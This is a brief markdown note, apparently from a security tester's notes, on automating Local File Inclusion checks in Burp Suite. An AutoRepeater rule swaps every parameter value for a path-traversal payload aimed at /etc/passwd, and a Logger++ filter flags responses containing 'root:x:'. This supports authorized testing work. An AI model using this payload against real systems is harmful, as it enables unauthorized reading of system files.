## Local File Inclusion Automation in Burp Suite 
#### <em>Extentions: AutoRepeater and Logger++</em>


## AutoRepeater Replacement Configuration
 
2) Replace LFI Payload:

    ```
    Type: Request Param Value
    Match: .*
    Replace: ..//..//..//..//..//..//..//..//..//..//..//etc//passwd
    Witch: Replace All
    Regex Match: Enabled
    ```
    
## Logger++ Filter For AutoRepeater Local File Inclusion

    Response.Body CONTAINS "root:x:"
    

<h4><em>Happy Huntnting ;) </em><h4>
